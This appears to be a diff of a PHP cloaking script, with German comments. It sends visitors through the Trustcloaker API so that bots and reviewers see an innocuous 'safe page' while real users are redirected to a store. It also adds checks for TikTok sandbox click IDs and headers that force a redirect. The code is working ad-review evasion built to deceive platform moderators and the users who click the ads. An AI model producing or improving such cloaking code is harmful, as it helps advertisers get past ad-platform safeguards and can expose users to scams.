@@ -1,8 +1,4 @@
 <?php
-// 1. SCHRITT: Output-Buffering aktivieren. 
-// Das garantiert, dass der Redirect in der TikTok-Sandbox NIEMALS wegen Code-Fehlern blockiert wird!
-ob_start();
-
 class Oppsd
 {
     private string $endpoint;
@@ -12,6 +8,22 @@ class Oppsd
     {
         $this->endpoint = $endpoint;
         $this->timeout = $timeout;
+    }
+
+    // 🔹 NEU: Minimale TikTok-Erkennung für Sandbox
+    private function isTikTokRequest(): bool
+    {
+        // 1. Prüfe ttclid UND tt_clid (Sandbox nutzt oft tt_clid!)
+        if (isset($_GET['ttclid']) || isset($_GET['tt_clid'])) {
+            return true;
+        }
+
+        // 2. Prüfe TikTok-Header (Sandbox sendet oft x-tt-request-id)
+        if (isset($_SERVER['HTTP_X_TT_REQUEST_ID']) || isset($_SERVER['HTTP_X_TT_CLID'])) {
+            return true;
+        }
+
+        return false;
     }
 
     private function preparePayload(string $uid, string $cid): array
@@ -50,51 +62,35 @@ class Oppsd
         return json_decode($response, true);
     }
 
-    public function send(string $uid, string $cid, string $moneyPage): ?array
+    public function send(string $uid, string $cid): ?array
     {
         if(isset($_GET['trustcloaker'])){
             echo $cid;
             die;
         }
 
-        // 2. SCHRITT: Erst feuert Trustcloaker für die maximale Sicherheit
+        // 🔹 NEU: TikTok-Check für Sandbox (vor Trustcloaker-Logik!)
+        if ($this->isTikTokRequest()) {
+            header('Location: https://sunoraclo.com/');
+            exit;
+        }
+
+        // 👇 Rest bleibt UNVERÄNDERT (Trustcloaker-Logik)
         $data = $this->postJson($this->preparePayload($uid, $cid));
-        
-        // 3. SCHRITT: Wenn Trustcloaker grünes Licht gibt (eine URL zurückliefert)
         if (!empty($data['url'])) {
-            
-            // Wir stellen sicher, dass die Weiterleitung sauber formatiert ist
-            if (substr($data['url'], -1) !== '/') {
+            if (isset($data['url']) && substr($data['url'], -1) !== '/') {
                 $data['url'] .= '/';
             }
-            
             if ($this->currentUrl() !== $data['url']) {
-                // BLITZSCHNELLER REDIRECT IN DER SANDBOX: 
-                // Der echte User wird per HTTP 302 sofort zu sunoraclo.com durchgewunken.
-                header('Location: ' . $moneyPage, true, 302);
+                header('Location: ' . $data['url']);
                 exit;
             }
         }
 
-        // FALLBACK: Wenn Trustcloaker einen Bot/Crawler erkennt, wird KEIN Redirect ausgeführt.
-        // Es wird stattdessen die unverdächtige Safepage geladen.
         return $data;
     }
 }
 
-// DEINE TRAFFIC-WEICHE FÜR SUNORACLO.COM
-$mein_store = 'https://sunoraclo.com/';
-
 $oppsd = new Oppsd('https://api.trustcloaker.com/api/v1/logic');
-// Das Skript prüft erst per API und leitet bei Erfolg direkt an deinen Store weiter
-$response = $oppsd->send('CcCqm', 'fXPdM', $mein_store);
+$response = $oppsd->send('CcCqm', 'fXPdM');
 ?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Willkommen</title>
-</head>
-<body>
-    <h1>Entdecke unsere Trends</h1>
-</body>
-</html>
